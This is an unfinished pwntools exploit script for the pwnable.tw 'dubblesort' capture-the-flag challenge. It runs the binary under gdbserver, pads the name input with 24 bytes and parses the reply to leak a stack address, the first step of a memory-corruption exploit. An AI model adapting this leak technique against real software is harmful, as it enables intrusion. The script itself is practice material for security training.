import struct
from pwn import *

#r = remote("chall.pwnable.tw", port=10101)
#r = process("./dubblesort")
r = process(["gdbserver", "localhost:1234", "dubblesort"])

base = 6
r.readuntil("name :")
r.sendline("A" * (base * 4))
r.recvuntil("Hello ")
name = r.recvuntil(",How")[:-4]
print(name.hex())
addr = struct.unpack("<I", name[base*4:(base+1)*4])[0]
print(hex(addr))

# x/30x $esp + 60